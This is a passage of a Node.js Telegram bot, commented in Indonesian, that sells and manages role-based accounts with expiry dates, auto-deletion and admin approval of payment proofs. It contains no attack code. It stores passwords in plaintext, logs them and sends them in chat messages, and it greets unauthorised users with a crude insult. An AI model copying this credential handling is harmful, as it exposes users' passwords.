        logDebug(`[🗃️] Database ${file} dibuat otomatis.`);
      } else if (file.endsWith('.txt')) {
        fs.writeFileSync(filePath, '');
        logDebug(`[📝] File ${file} dibuat otomatis.`);
      }
    }
  }
  
  // Load tracking data
  initializeTrackingFile();
  
  // Pastikan folder apk_files ada
  const apkDir = path.join(__dirname, 'apk_files');
  if (!fs.existsSync(apkDir)) {
    fs.mkdirSync(apkDir, { recursive: true });
    logDebug(`[📁] Folder ${apkDir} dibuat otomatis.`);
  }
}

// Panggil fungsi inisialisasi saat bot start
initializeDatabase();

// Telegram Bot Functions
const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

// Fungsi untuk memuat data akses
function loadAkses() {
  try {
    if (fs.existsSync('akses.json')) {
      return JSON.parse(fs.readFileSync('akses.json', 'utf8'));
    }
  } catch (e) {
    console.error('Error loading akses:', e);
  }
  return {};
}

function saveAkses(akses) {
  fs.writeFileSync('akses.json', JSON.stringify(akses, null, 2));
}

function initializeAksesFile() {
  if (!fs.existsSync('akses.json')) {
    const initialAkses = {
      "8361992505": "developer"  // ID developer/owner default
    };
    fs.writeFileSync('akses.json', JSON.stringify(initialAkses, null, 2));
    logDebug("[🔑] File akses.json dibuat otomatis dengan akun owner.");
  }
}

function getAdminIds() {
  const akses = loadAkses();
  const adminIds = [];
  
  for (const [id, role] of Object.entries(akses)) {
    if (role === 'developer' || role === 'owner') {
      adminIds.push(id.toString());
    }
  }
  
  return adminIds;
}

// Fungsi untuk cek apakah user adalah admin (owner/developer)
// Fungsi untuk cek apakah user adalah admin (owner/developer/staf)
function isAdmin(userId) {
  const akses = loadAkses();
  const role = akses[userId];
  return role === 'developer' || role === 'owner' || role === 'staff';
}

function hasPendingBuyarTransaction(userId) {
    // Cek dari pendingTransactions
    for (const [trxId, transaction] of Object.entries(pendingTransactions)) {
        if (transaction.creatorId == userId && transaction.status === 'pending') {
            return true;
        }
    }
    
    // Cek dari userPendingBuyar
    if (userPendingBuyar[userId] && userPendingBuyar[userId].status === 'pending') {
        return true;
    }
    
    return false;
}

// Update fungsi canCreateRole
function canCreateRole(userId, role) {
  const userRole = getUserRole(userId);
  const userTrack = accountCreationTracker[userId] || {};
  
  // DEVELOPER unlimited untuk semua role
  if (userRole === 'developer') {
    return true;
  }
  
  // OWNER unlimited untuk semua role (kecuali STAF - tidak bisa buat STAF)
  if (userRole === 'owner' && role !== 'staff') {
    return true;
  }
  
  // STAF bisa membuat akun pribadi (member) tapi tidak bisa membuat role lain
  if (userRole === 'staff') {
    if (role === 'member') {
      return true; // STAF bisa membuat akun member
    }
    return false; // STAF tidak bisa membuat role VIP, RESELLER, dll
  }
  
  // Cek apakah user masih memiliki akun aktif dengan role yang sama
  const db = loadDatabaseCached();
  const now = new Date();
  const existingAccount = db.find(u => u.telegramId === userId && u.role === role);
  
  if (existingAccount) {
    const expiredDate = new Date(existingAccount.expiredDate);
    if (expiredDate > now) {
      // Akun masih aktif
      return false;
    }
  }
  
  // Jika tidak ada akun aktif atau sudah expired, izinkan membuat baru
  if (role === 'vip' && userTrack.hasCreatedVip) {
    return false;
  }
  
  if (role === 'reseller' && userTrack.hasCreatedReseller) {
    return false;
  }
  
  if (role === 'member') {
    return true;
  }
  
  return true;
}


// Fungsi cek apakah chat private
function onlyPrivate(msg) {
  return msg.chat.type === 'private';
}

function saveUserToDatabase(username, password, role, days, telegramId = null, chatId = null) {
  try {
    console.log(`[DEBUG] saveUserToDatabase called with:`, { username, password, role, days, telegramId, chatId });
    
    const db = loadDatabaseCached();
    
    // Cek apakah username sudah ada (case insensitive)
    if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
      console.log(`[DEBUG] Username ${username} already exists`);
      return { success: false, message: "Username sudah terdaftar!" };
    }
    
    // Hitung tanggal expired
    let expiredDate;
    if (days === 99999) { // Permanen
      const now = new Date();
      expiredDate = new Date(now.getFullYear() + 100, now.getMonth(), now.getDate());
    } else {
      const now = new Date();
      expiredDate = new Date(now);
      expiredDate.setDate(now.getDate() + days);
    }
    
    // Format tanggal
    const formattedDate = expiredDate.toISOString().split('T')[0];
    
    // Normalisasi role: lowercase untuk database
    let normalizedRole = role.toLowerCase();
    
    // Cek apakah custom expired (bukan dari pilihan default)
    const isCustomExpired = ![7, 30, 60, 90, 120, 99999].includes(days);
    
    // Buat objek user
    const newUser = {
      username: username.trim(),
      password: password.trim(),
      role: normalizedRole,
      expiredDate: formattedDate,
      telegramId: telegramId || null,
      bitcoin: 0,
      stars: 0,
      createdAt: new Date().toISOString(),
      days: days,
      isCustomExpired: isCustomExpired,
      createdBy: chatId, // Simpan siapa yang membuat
      status: 'active' // LANGSUNG ACTIVE
    };
    
    // Simpan ke database
    db.push(newUser);
    saveDatabaseCached(db);
    
    console.log(`[DEBUG] User saved to database:`, newUser);
    
    // Simpan juga ke keyList.json dengan format yang sama
    try {
      const keyList = loadKeyList();
      keyList.push({
        username: username.trim(),
        password: password.trim(),
        role: normalizedRole,
        lastLogin: new Date().toISOString(),
        days: days,
        isCustomExpired: isCustomExpired,
        status: 'active'
      });
      saveKeyList(keyList);
      console.log(`[DEBUG] User saved to keyList.json`);
    } catch (e) {
      console.log("Info: Gagal menyimpan ke keyList, lanjutkan...");
    }
    
    // Log ke file
    const logLine = `[${new Date().toISOString()}] ${telegramId || 'SYSTEM'} created ${username} (${role}) for ${days} days${isCustomExpired ? ' (CUSTOM)' : ''}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
    console.log(`[DEBUG] saveUserToDatabase success for ${username}`);
    
    return { 
      success: true, 
      message: "Akun berhasil dibuat!",
      role: normalizedRole
    };
  } catch (error) {
    console.log(`[ERROR] saveUserToDatabase error:`, error);
    return { success: false, message: `Error: ${error.message}` };
  }
}

// Update fungsi getUserRole (sudah otomatis karena membaca dari akses.json)
function getUserRole(telegramId) {
  const akses = loadAkses();
  const role = akses[telegramId] || null;
  
  // Jika user tidak punya akses, hapus dari tracker (bersih-bersih)
  if (!role && accountCreationTracker[telegramId]) {
    delete accountCreationTracker[telegramId];
  }
  
  return role;
}

let userPendingData = {}; // Tracking pembuatan akun per user
const accountCreationTracker = {}; // Tracking pembuatan akun untuk limitasi
const deletePendingData = {}; // Untuk menyimpan data pending delete
const pendingTransactions = {}; // Untuk menyimpan transaksi pending
const userPendingBuyar = {}; // Tracking pembuatan akun per user

// Update fungsi trackAccountCreation di atas
function trackAccountCreation(userId, role) {
  if (!accountCreationTracker[userId]) {
    accountCreationTracker[userId] = {};
  }
  
  if (role === 'vip') {
    accountCreationTracker[userId].hasCreatedVip = true;
  } else if (role === 'reseller') {
    accountCreationTracker[userId].hasCreatedReseller = true;
  } else if (role === 'owner') {
    accountCreationTracker[userId].hasCreatedOwner = true;
  } else if (role === 'member') {
    // Member tidak perlu tracking untuk limit
  }
  
  // Simpan ke file untuk persistensi
  try {
    fs.writeFileSync('accountTracker.json', JSON.stringify(accountCreationTracker, null, 2));
  } catch (e) {
    console.log('Gagal menyimpan account tracker:', e.message);
  }
}

try {
  if (fs.existsSync('accountTracker.json')) {
    const savedTracker = JSON.parse(fs.readFileSync('accountTracker.json', 'utf8'));
    Object.assign(accountCreationTracker, savedTracker);
    console.log('[DEBUG] Account tracker loaded');
  }
} catch (e) {
  console.log('Gagal load account tracker:', e.message);
}

// Tambahkan fungsi auto delete untuk akun expired
function autoDeleteExpiredAccounts() {
  const db = loadDatabaseCached();
  const now = new Date();
  let deletedCount = 0;
  
  for (let i = db.length - 1; i >= 0; i--) {
    const user = db[i];
    const expiredDate = new Date(user.expiredDate);
    
    if (expiredDate < now) {
      const username = user.username;
      const telegramId = user.telegramId;
      
      // Hapus dari database
      db.splice(i, 1);
      
      // Hapus dari keyList.json
      try {
        const keyList = loadKeyList();
        const filteredKeyList = keyList.filter(k => k.username !== username);
        saveKeyList(filteredKeyList);
      } catch (e) {}
      
      // Hapus tracking
      if (telegramId) {
        removeAccountTracking(telegramId);
      }
      
      deletedCount++;
      
      // Log ke file
      const logLine = `[${new Date().toISOString()}] AUTO DELETE: ${username} (EXPIRED)\n`;
      fs.appendFileSync('logUser.txt', logLine);
      
      // Kirim notifikasi ke user jika memiliki telegramId
      if (telegramId) {
        try {
          bot.sendMessage(
            telegramId,
            `⚠️ <b>AKUN ANDA TELAH EXPIRED!</b>\n\n` +
            `👤 Username: <code>${username}</code>\n` +
            `📅 Expired: ${user.expiredDate}\n\n` +
            `Akun Anda telah dihapus otomatis dari sistem.\n` +
            `Silahkan buat akun baru dengan menekan tombol <b>BUAT AKUN PRIBADI</b> di /start.`,
            { parse_mode: "HTML" }
          ).catch(() => {});
        } catch (e) {}
      }
    }
  }
  
  if (deletedCount > 0) {
    saveDatabaseCached(db);
    logDebug(`[AUTO DELETE] Removed ${deletedCount} expired accounts`);
  }
}

// Panggil auto delete setiap jam
setInterval(() => {
  autoDeleteExpiredAccounts();
}, 60 * 60 * 1000); // Setiap 1 jam

// Update fungsi deleteUserAccount di atas
function deleteUserAccount(username, deleterUserId) {
  try {
    const db = loadDatabaseCached();
    
    // Cari index user yang akan dihapus
    const userIndex = db.findIndex(u => u.username.toLowerCase() === username.toLowerCase());
    
    if (userIndex === -1) {
      return { success: false, message: "❌ Username tidak ditemukan!" };
    }
    
    const userToDelete = db[userIndex];
    const deleterRole = getUserRole(deleterUserId);
    
    // Cek apakah akun expired
    const expiredDate = new Date(userToDelete.expiredDate);
    const now = new Date();
    const isExpired = expiredDate < now;
    
    // Jika akun belum expired dan yang menghapus bukan owner/developer, tolak
    if (!isExpired && deleterRole !== 'owner' && deleterRole !== 'developer') {
      const daysLeft = Math.ceil((expiredDate - now) / (1000 * 60 * 60 * 24));
      return { 
        success: false, 
        message: `❌ Akun masih aktif! Sisa ${daysLeft} hari. Hanya bisa dihapus saat expired.` 
      };
    }
    
    // Validasi: Hanya owner yang bisa menghapus semua akun
    // VIP dan Reseller hanya bisa menghapus akun dengan role member yang sudah expired
    if ((deleterRole === 'vip' || deleterRole === 'reseller') && userToDelete.role !== 'member') {
      return { 
        success: false, 
        message: `❌ Anda tidak bisa menghapus akun dengan role ${userToDelete.role.toUpperCase()}!` 
      };
    }
    
    // Hapus akun dari database
    db.splice(userIndex, 1);
    saveDatabaseCached(db);
    
    // Hapus juga dari keyList.json
    try {
      const keyList = loadKeyList();
      const filteredKeyList = keyList.filter(k => k.username.toLowerCase() !== username.toLowerCase());
      saveKeyList(filteredKeyList);
    } catch (e) {
      console.log("Info: Gagal menghapus dari keyList, lanjutkan...");
    }
    
    // Hapus tracking jika akun yang dihapus adalah akun pribadi
    if (userToDelete.telegramId) {
      removeAccountTracking(userToDelete.telegramId);
    }
    
    // Log ke file
    const reason = isExpired ? "EXPIRED" : "MANUAL DELETE";
    const logLine = `[${new Date().toISOString()}] ${deleterUserId} deleted ${username} (${reason}) - telegramId: ${userToDelete.telegramId || 'none'}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
    return { 
      success: true, 
      message: `✅ Akun <code>${username}</code> berhasil dihapus!\n\n<i>Pengguna sekarang dapat membuat akun pribadi baru.</i>` 
    };
  } catch (error) {
    return { success: false, message: `❌ Error: ${error.message}` };
  }
}

// Update fungsi processInstantPersonalAccount
// Tambahkan fungsi untuk cek role FULL UPDATE
function isFullUpdateRole(userId) {
  const akses = loadAkses();
  return akses[userId] === 'full_update';
}

// Perbaiki fungsi processInstantPersonalAccount untuk role FULL UPDATE
async function processInstantPersonalAccount(chatId, userId, username, password) {
    try {
        console.log(`[DEBUG] Processing instant personal account for user ${userId}`);
        
        const userRole = getUserRole(userId);
        
        // Cek apakah user memiliki akses
        if (!userRole) {
            const errorMsg = await bot.sendMessage(chatId, 
                "❌ Anda tidak memiliki akses untuk membuat akun!",
                { parse_mode: "HTML" }
            );
            setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 3000);
            return;
        }
        
        // Cek apakah user sudah memiliki akun pribadi yang masih aktif
        const db = loadDatabaseCached();
        const now = new Date();
        const existingAccount = db.find(u => u.telegramId === userId);
        
        if (existingAccount) {
            const expiredDate = new Date(existingAccount.expiredDate);
            const isExpired = expiredDate < now;
            
            if (!isExpired) {
                // Akun masih aktif, tolak pembuatan baru
                const daysLeft = Math.ceil((expiredDate - now) / (1000 * 60 * 60 * 24));
                const errorMsg = await bot.sendMessage(chatId, 
                    `❌ Anda sudah memiliki akun PRIBADI yang masih aktif!\n\n` +
                    `👤 Username: <code>${existingAccount.username}</code>\n` +
                    `⏰ Sisa masa aktif: ${daysLeft} hari\n` +
                    `📅 Expired: ${existingAccount.expiredDate}\n\n` +
                    `Gunakan tombol <b>DELETE AKUN PRIBADI</b> jika ingin menghapus akun saat ini.`,
                    { parse_mode: "HTML" }
                );
                setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 10000);
                return;
            } else {
                // Akun expired, hapus tracking dan izinkan membuat baru
                console.log(`[DEBUG] Account for ${userId} is expired, removing tracking`);
                removeAccountTracking(userId);
            }
        }
        
        // Cek apakah username sudah digunakan
        if (db.some(u => u.username.toLowerCase() === username.toLowerCase())) {
            const errorMsg = await bot.sendMessage(chatId, 
                `❌ Username <code>${username}</code> sudah digunakan!`,
                { parse_mode: "HTML" }
            );
            setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 3000);
            return;
        }
        
        // PERBAIKAN: Untuk FULL UPDATE, role yang dibuat HARUS MEMBER
        let finalRole = userRole;
        if (userRole === 'full_update') {
            finalRole = 'member';
        }
        
        // PERBAIKAN: Untuk FULL UPDATE, expired HARUS PERMANEN (99999 hari)
        let finalDays = 99999; // PERMANEN
        if (userRole !== 'full_update') {
            finalDays = 99999; // Tetap permanen untuk semua role
        }
        
        // Buat akun
        const result = saveUserToDatabase(
            username, 
            password, 
            finalRole, // Role sesuai dengan finalRole
            finalDays, // PERMANEN
            userId, // telegramId
            userId // creatorId
        );
        
        if (result.success) {
            // Track pembuatan akun personal (kecuali owner/developer dan full_update)
            if (userRole !== 'owner' && userRole !== 'developer' && userRole !== 'full_update') {
                if (!accountCreationTracker[userId]) {
                    accountCreationTracker[userId] = {};
                }
                accountCreationTracker[userId].hasCreatedPersonal = true;
                
                // Simpan tracker
                try {
                    fs.writeFileSync('accountTracker.json', JSON.stringify(accountCreationTracker, null, 2));
                } catch (e) {
                    console.log('Gagal menyimpan account tracker:', e.message);
                }
            }
            
            // Kirim pesan sukses
            let successMessage = `
<b>✅ AKUN PRIBADI BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${finalRole.toUpperCase()}</b>
⏰ Expired: <b>PERMANEN</b>

━━━━━━━━━━━━━━━━━━━
<i>Akun pribadi Anda sudah aktif dan siap digunakan!</i>

⏳ Pesan ini akan otomatis terhapus dalam 10 detik...
`;

            // Tambahkan catatan khusus untuk FULL UPDATE
            if (userRole === 'full_update') {
                successMessage = `
<b>✅ AKUN PRIBADI BERHASIL DIBUAT!</b>

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>MEMBER</b>
⏰ Expired: <b>PERMANEN</b>

━━━━━━━━━━━━━━━━━━━
<i>Akun pribadi dengan role MEMBER (permanen) berhasil dibuat!</i>

⏳ Pesan ini akan otomatis terhapus dalam 10 detik...
`;
            }

            const sentMsg = await bot.sendMessage(chatId, successMessage, {
                parse_mode: "HTML"
            });

            // Auto delete setelah 10 detik
            setTimeout(() => {
                bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
            }, 10000);
            
            // Log ke file
            const logLine = `[${new Date().toISOString()}] INSTANT PERSONAL: ${userId} (${userRole}) created ${username} (${finalRole}) PERMANEN\n`;
            fs.appendFileSync('logUser.txt', logLine);
            
        } else {
            const errorMsg = await bot.sendMessage(chatId, `❌ Gagal membuat akun: ${result.message}`, {
                parse_mode: "HTML"
            });
            setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
        }
        
    } catch (error) {
        console.log(`[ERROR] Instant personal account error:`, error);
        const errorMsg = await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
            parse_mode: "HTML"
        });
        setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 5000);
    }
}

// --- DATABASE DARURAT (In-Memory) untuk fitur remote tools ---
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat.type;
  
  // Periksa apakah ini private chat atau group
  const isPrivate = chatType === 'private';
  
  // Cek role pengguna
  const userRole = getUserRole(userId);
  
  if (!userRole) {
    // Jika belum ada akses
    if (isPrivate) {
      bot.sendMessage(
        chatId,
        "Kocak Belum Di Add Lu Tolol Menimal Modal Doang 😹"
      );
    }
    return;
  }
  
  // Tampilkan pesan sambutan berdasarkan role
  const username = msg.from.first_name || msg.from.username || "User";
  
  const welcomeMessage = `
<blockquote><b>👋Welcome ${username}</b></blockquote>
┌─────────────────────
│ 👤 <b>Status Anda</b>
│ • Nama : ${username}
│ • Id Telegram : ${userId}
│ • Role : ${userRole.toUpperCase()}
└─────────────────────
      <blockquote>[ 𝗔𝗟𝗟 𝗔𝗞𝗦𝗘𝗦 𝗕𝗢𝗧 ]</blockquote>
┌─────────────────────
│ • /ckey unsername,password 
│ • /cekrole reply pesan 
│ • /delakun unsername 
│ • /addakses id telegram
│ • /delakses id telegram 
└─────────────────────
<blockquote><b>CLICK BUTTON IS HERE</b></blockquote>
`;
  
// Cari bagian keyboard di bot.onText(/\/start/, ...) dan ubah menjadi:

const keyboard = {
    inline_keyboard: [
      [
        {
          text: "📝 BUAT AKUN PRIBADI",
          callback_data: "create_personal",
          style: "danger"
        },
        {
          text: "🗑️ DELETE AKUN PRIBADI",
          callback_data: "delete_personal"
        }
      ],
      [
        {
          text: "[ DEVELOPER ]",
          url: "https://t.me/By_Zii16"
        }
      ]
    ]
};
  
  // Kirim pesan dengan foto dan keyboard
  try {
    // Jika ada foto, kirim dengan foto
    const photoUrl = "https://h.top4top.io/p_3723ehw861.jpg";
    
    if (isPrivate) {
      // Kirim dengan foto di private chat
      bot.sendPhoto(chatId, photoUrl, {
        caption: welcomeMessage,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    } else {
      // Di group, kirim dalam 1 pesan saja
      bot.sendPhoto(chatId, photoUrl, {
        caption: welcomeMessage,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
    }
  } catch (error) {
    // Jika gagal kirim foto, kirim teks saja
    bot.sendMessage(chatId, welcomeMessage, {
      parse_mode: "HTML",
      reply_markup: keyboard
    });
  }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    // Cek apakah ini format username|password untuk akun pribadi
    if (text && text.includes('|') && !text.startsWith('/')) {
        const parts = text.split('|');
        if (parts.length === 2) {
            const username = parts[0].trim();
            const password = parts[1].trim();
            
            // Validasi username dan password
            if (username.length < 3 || password.length < 3) {
                const errorMsg = await bot.sendMessage(chatId, 
                    "❌ Username dan password minimal 3 karakter!",
                    { parse_mode: "HTML" }
                );
                setTimeout(() => bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {}), 3000);
                return;
            }
            
            // Proses pembuatan akun pribadi
            await processInstantPersonalAccount(chatId, userId, username, password);
            return;
        }
    }
    
    // Cek apakah ini input custom expired dari user
    if (text && userPendingData[userId] && userPendingData[userId].step === 'custom_expired') {
        const pendingData = userPendingData[userId];
        const { username, password, telegramId, userRole } = pendingData;
        
        // Validasi lagi role user - HANYA owner, developer dan VIP
        const currentRole = getUserRole(userId);
        const allowedRoles = ['owner', 'developer', 'vip'];
        
        if (!allowedRoles.includes(currentRole)) {
            // Auto delete pesan user
            try {
                await bot.deleteMessage(chatId, msg.message_id);
            } catch (e) {}
            
            const errorMsg = await bot.sendMessage(chatId, 
                "❌ Akses ditolak! Custom Expired hanya untuk Owner, Developer dan VIP.",
                { parse_mode: "HTML" }
            );
            
            setTimeout(() => {
                bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
            }, 3000);
            
            delete userPendingData[userId];
            return;
        }
        
        // Auto delete pesan user
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        // Validasi format input
        let days = 0;
        let inputType = "";
        let isValidFormat = false;
        
        // Cek untuk permanent
        if (text.toLowerCase() === 'perm' || text.toLowerCase() === 'permanent' || text.toLowerCase() === '∞') {
            days = 99999; // Permanen
            inputType = "PERMANEN";
            isValidFormat = true;
        } else {
            // Parsing format: angka + huruf
            const match = text.match(/^(\d+(?:\.\d+)?)([hdwmy])$/i);
            if (match) {
                const value = parseFloat(match[1]);
                const unit = match[2].toLowerCase();
                
                // Konversi ke hari
                switch(unit) {
                    case 'h': // Jam
                        days = value / 24;
                        inputType = `${value} Jam`;
                        break;
                    case 'd': // Hari
                        days = value;
                        inputType = `${value} Hari`;
                        break;
                    case 'w': // Minggu
                        days = value * 7;
                        inputType = `${value} Minggu`;
                        break;
                    case 'm': // Bulan
                        days = value * 30;
                        inputType = `${value} Bulan`;
                        break;
                    case 'y': // Tahun
                        days = value * 365;
                        inputType = `${value} Tahun`;
                        break;
                }
                
                // Validasi nilai minimal
                if (days < 0.0417) { // Kurang dari 1 jam
                    const errorMsg = await bot.sendMessage(chatId, 
                        "❌ Nilai terlalu kecil!\n\n" +
                        "Minimal 1 jam.\n" +
                        "Contoh: <code>1h</code> = 1 jam", 
                        { parse_mode: "HTML" }
                    );
                    
                    setTimeout(() => {
                        bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
                    }, 5000);
                    return;
                }
                
                // Bulatkan ke atas
                days = Math.ceil(days);
                isValidFormat = true;
            }
        }
        
        if (!isValidFormat) {
            const errorMsg = await bot.sendMessage(chatId, 
                "❌ Format salah!\n\n" +
                "<b>Format yang diterima:</b>\n" +
                "• <code>1.5h</code> → 1.5 Jam\n" +
                "• <code>15h</code> → 15 Jam\n" +
                "• <code>0.5d</code> → 12 Jam\n" +
                "• <code>45d</code> → 45 Hari\n" +
                "• <code>2.5w</code> → 2.5 Minggu\n" +
                "• <code>3.5m</code> → 3.5 Bulan\n" +
                "• <code>2.5y</code> → 2.5 Tahun\n" +
                "• <code>perm</code> → PERMANEN", 
                { parse_mode: "HTML" }
            );
            
            setTimeout(() => {
                bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
            }, 5000);
            return;
        }
        
        // Validasi batas maksimal berdasarkan role
        let maxDays = 36500; // Default 100 tahun untuk owner
        
        if (currentRole === 'vip') {
            maxDays = 365 * 10; // VIP maksimal 10 tahun
        }
        
        if (days > maxDays && days !== 99999) {
            const roleLimits = {
                'vip': "10 tahun (3650 hari)",
                'owner': "tidak terbatas",
                'developer': "tidak terbatas"
            };
            
            const errorMsg = await bot.sendMessage(chatId, 
                `❌ Masa aktif terlalu lama!\n\n` +
                `Role <b>${currentRole.toUpperCase()}</b> maksimal: ${roleLimits[currentRole]}\n\n` +
                `Input Anda: ${inputType} (${days} hari)\n` +
                `Maksimal yang diperbolehkan: ${maxDays} hari`, 
                { parse_mode: "HTML" }
            );
            
            setTimeout(() => {
                bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
            }, 5000);
            return;
        }
        
        // Update data pending
        userPendingData[userId] = { 
            ...pendingData,
            days: days,
            inputType: inputType,
            step: 'select_type'
        };
        
        // Tampilkan pilihan BUYAR atau PRIBADI
        showAccountTypeSelection(chatId, username, password, telegramId, days, currentRole, inputType, userId);
    }
    
    // Handler untuk bukti transaksi (foto) - UNTUK RESELLER
    else if (msg.photo && userPendingData[userId] && userPendingData[userId].step === 'waiting_proof') {
        const pendingData = userPendingData[userId];
        const { username, password, days, inputType, selectedRole, userRole, creatorName, creatorId } = pendingData;
        
        // Cek apakah user sudah memiliki transaksi buyar pending
        if (hasPendingBuyarTransaction(userId)) {
            // Auto delete foto
            try {
                await bot.deleteMessage(chatId, msg.message_id);
            } catch (e) {}
            
            // Auto delete pesan "Kirimkan Bukti Transaksi"
            try {
                await bot.deleteMessage(chatId, pendingData.messageId);
            } catch (e) {}
            
            const errorMsg = await bot.sendMessage(chatId, 
                "❌ Anda masih memiliki transaksi BUYAR yang pending!\n\n" +
                "Tunggu hingga transaksi sebelumnya dikonfirmasi oleh admin sebelum membuat transaksi BUYAR baru.",
                { parse_mode: "HTML" }
            );
            
            setTimeout(() => {
                bot.deleteMessage(chatId, errorMsg.message_id).catch(() => {});
            }, 5000);
            
            delete userPendingData[userId];
            return;
        }
        
        // Dapatkan file_id foto terbesar
        const photo = msg.photo[msg.photo.length - 1];
        const fileId = photo.file_id;
        
        // Auto delete pesan bukti dari user
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        // Auto delete pesan "Kirimkan Bukti Transaksi"
        try {
            await bot.deleteMessage(chatId, pendingData.messageId);
        } catch (e) {}
        
        // Generate unique ID untuk transaksi
        const transactionId = 'TRX_' + Math.random().toString(36).substring(2, 10).toUpperCase();
        
        // Simpan data transaksi pending
        pendingTransactions[transactionId] = {
            username,
            password,
            days,
            inputType: inputType || (days === 99999 ? "PERMANEN" : `${days} hari`),
            selectedRole: selectedRole || 'member', // DEFAULT VALUE jika undefined
            creatorId: userId,
            creatorName: msg.from.first_name || msg.from.username || 'Unknown',
            targetUsername: username,
            targetPassword: password,
            photoFileId: fileId,
            timestamp: Date.now(),
            status: 'pending',
            approvedBy: null, // Untuk tracking siapa yang approve
            approvedAt: null
        };
        
        // Tracking user yang sedang dalam proses buyar
        userPendingBuyar[userId] = {
            transactionId,
            timestamp: Date.now(),
            status: 'pending'
        };
        
        // Kirim pesan tunggu ke user
        const waitingMsg = await bot.sendMessage(chatId, 
            `⏳ <b>TUNGGU ADMIN MENGKONFIRMASI AKUN ANDA</b>\n\n` +
            `ID Transaksi: <code>${transactionId}</code>\n\n` +
            `Mohon tunggu sebentar, admin akan segera mengkonfirmasi pembayaran Anda.\n\n` +
            `⚠️ <b>PENTING:</b> Anda tidak dapat membuat transaksi BUYAR baru sampai transaksi ini dikonfirmasi.`,
            { parse_mode: "HTML" }
        );
        
        // Auto delete setelah 1 menit
        setTimeout(() => {
            bot.deleteMessage(chatId, waitingMsg.message_id).catch(() => {});
        }, 60000);
        
        // Kirim ke SEMUA admin (owner dan developer) untuk konfirmasi
        const adminIds = getAdminIds(); // Fungsi untuk mendapatkan semua ID admin
        
        // Pastikan role memiliki nilai default
        const safeSelectedRole = selectedRole || 'member';
        const accountTypeText = inputType || (days === 99999 ? "PERMANEN" : `${days} hari`);
        
        for (const adminId of adminIds) {
            try {
                const confirmMessage = `
<b>🔔 TRANSAKSI BARU - BUTUH KONFIRMASI</b>

━━━━━━━━━━━━━━━━━━━
<b>AKUN BUYAR</b>

👤 <b>PEMBELI:</b>
• Nama: ${msg.from.first_name || msg.from.username || 'Unknown'}
• ID: <code>${userId}</code>
• Username: @${msg.from.username || 'None'}

━━━━━━━━━━━━━━━━━━━
<b>DETAIL AKUN BUYAR</b>

👤 Username: <code>${username}</code>
🔒 Password: <code>${password}</code>
🔥 Role: <b>${safeSelectedRole.toUpperCase()}</b>
⏰ Expired: ${accountTypeText}
🆔 ID Transaksi: <code>${transactionId}</code>

━━━━━━━━━━━━━━━━━━━
<b>⬇️ BUKTI TRANSFER</b>
`;

                // Kirim foto bukti dengan caption dan tombol konfirmasi
                await bot.sendPhoto(adminId, fileId, {
                    caption: confirmMessage,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ TERIMA", callback_data: `accept_trx_${transactionId}` },
                                { text: "❌ TOLAK", callback_data: `reject_trx_${transactionId}` }
                            ]
                        ]
                    }
                });
            } catch (e) {
                console.log(`Gagal kirim ke admin ${adminId}:`, e.message);
            }
        }
        
        // Hapus data pending
        delete userPendingData[userId];
    }
    
    // Cek apakah ini input username untuk delete via command /delakun
    else if (text && text.startsWith('/delakun ')) {
        const username = text.replace('/delakun ', '').trim();
        const userRole = getUserRole(userId);
        
        // Cek apakah user memiliki akses (owner, developer, vip, reseller)
        if (!userRole || (userRole !== 'owner' && userRole !== 'developer' && userRole !== 'vip' && userRole !== 'reseller')) {
            bot.sendMessage(chatId, "❌ Anda tidak memiliki akses untuk menghapus akun!");
            return;
        }
        
        // Auto delete pesan command
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        // Hapus akun
        const result = deleteUserAccount(username, userId);
        
        // Kirim hasil
        const resultMsg = await bot.sendMessage(chatId, result.message, {
            parse_mode: "HTML"
        });
        
        // Auto delete pesan hasil setelah 10 detik
        setTimeout(() => {
            bot.deleteMessage(chatId, resultMsg.message_id).catch(() => {});
        }, 10000);
    }
});

// Fungsi untuk mendapatkan semua ID developer
function getDeveloperIds() {
  const akses = loadAkses();
  const developerIds = [];
  
  for (const [id, role] of Object.entries(akses)) {
    if (role === 'developer' || role === 'owner') {
      developerIds.push(id);
    }
  }
  
  return developerIds;
}

// Handle callback queries
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    const userRole = getUserRole(userId);
    
    // Handler untuk ACCEPT TRANSACTION
    if (data.startsWith("accept_trx_")) {
